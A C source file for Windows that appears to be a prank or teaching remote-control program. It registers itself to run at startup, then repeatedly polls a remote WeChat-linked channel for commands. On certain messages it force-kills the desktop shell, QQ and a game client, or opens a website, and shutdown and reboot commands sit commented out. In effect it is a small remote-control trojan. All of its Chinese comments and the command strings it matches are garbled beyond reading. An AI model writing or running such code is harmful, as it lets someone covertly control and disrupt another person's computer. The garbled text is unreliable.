#include<stdio.h>
#include<windows.h>	//Sleep����������������
#include "itmojun.h"

#pragma comment(lib, "itmojun.lib")//���뵱ǰ����Ŀ¼�µ� itmojun.lib ���ļ�

int main() 
{
	char cmd[301];//��Ŵ�΢�Ŷ˽��յ���Ϣ

	AutoRun(); //����ǰ��������Ϊ�����Զ�����

	while(1) 
	{
			GetPCCmd("d1h78923", cmd);//��΢�Ŷ˽���һ����Ϣ�����û���κ���Ϣ������һֱ�ȴ�
			//��һ������Ϊ����id����ͬ���Խ���ʹ�ò�ͬ��id
			//�ڶ�������Ϊ������Ϣ������

			printf("%s\n",cmd);

			if (strstr(cmd, "�ػ�")) //strstr����һ���ַ����в������ַ���������ҵ��򷵻���ָ�룬���򷵻�null
			{
				//WinExec("shutdown -s -t 0", 0);//�ػ�
			} 
			else if (strstr(cmd, "����")) 
			{
				//WinExec("shutdown -r -t 0", 0);//����
			}
			else if (strstr(cmd, "����")) 
			{
				static int kill_flag = 1;

				if(kill_flag)
					WinExec("taskkill /f /im explorer.exe", 0);//�ɵ�����
				else
					WinExec("c:\\windows\\explorer.exe", 1);//�ָ�����
				kill_flag = !kill_flag;
			}
			else if (strstr(cmd, "ɱ���")) 
			{
				WinExec("taskkill /f /im qq.exe", 0);//ǿ�ƽ���QQ
			}
			else if (strstr(cmd, "����")) 
			{
				WinExec("taskkill /f /im client.exe", 0);//ǿ�ƽ���Ӣ������
			}
			else if (strstr(cmd, "���")) 
			{
				WinExec("explorer https://itmojun.com", 1);//ǿ�ƽ���Ӣ������
			}
			

			Sleep(3000);//��ʱ3�룬������յ��ظ�����Ϣ����Ϊ��Ϣ���ڷ��������ݴ�3��
	}

	return 0;
}